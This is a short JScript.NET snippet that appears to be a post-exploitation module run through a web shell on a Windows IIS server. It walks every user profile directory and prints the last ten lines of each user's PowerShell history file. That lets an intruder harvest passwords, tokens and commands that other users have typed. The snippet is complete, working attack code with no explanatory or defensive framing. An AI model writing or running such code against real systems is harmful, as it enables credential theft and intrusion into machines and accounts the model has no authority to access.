(function() {

    var Directory = System.IO.Directory;
    var File = System.IO.File;
    var Path = System.IO.Path;

    var usersPath = "C:\\Users";
    if (!Directory.Exists(usersPath)) {
        usersPath = "C:\\Documents and Settings"; // Windows XP/2003 fallback
        if (!Directory.Exists(usersPath)) {
            return "ERROR: No user profiles directory found (C:\\Users or C:\\Documents and Settings)";
        }
    }

    var userDirs = Directory.GetDirectories(usersPath);
    var foundAny = false;
    var result = "[+] Scanning PowerShell history in user profiles...\n";
    result += "Base path: " + usersPath + "\n\n";

    for (var i = 0; i < userDirs.Length; i++) {
        var userDir = userDirs[i];
        var userName = Path.GetFileName(userDir);
        if (userName === "Public" || userName === "All Users" || userName === "Default" || userName === "Default User") {
            continue;
        }

        var historyFile = Path.Combine(userDir, "AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt");
        if (!File.Exists(historyFile)) {
            continue;
        }

        try {

            var lines = File.ReadAllLines(historyFile);
            var total = lines.Length;
            if (total === 0) continue;

            foundAny = true;
            result += "=== USER: " + userName + " ===\n";
            result += "File: " + historyFile + "\n";
            result += "Last " + (total > 10 ? "10" : total.toString()) + " commands:\n";

            var start = total > 10 ? total - 10 : 0;
            for (var j = start; j < total; j++) {
                result += (j - start + 1) + ". " + lines[j] + "\n";
            }
            result += "\n";

        } catch (e) {
            continue;
        }
    }

    if (!foundAny) {
        result += "No readable PowerShell history files found in any user profile.\n";
        result += "Note: Web server context (IIS) typically has no access to user profiles.\n";
    }

    return result;
})()
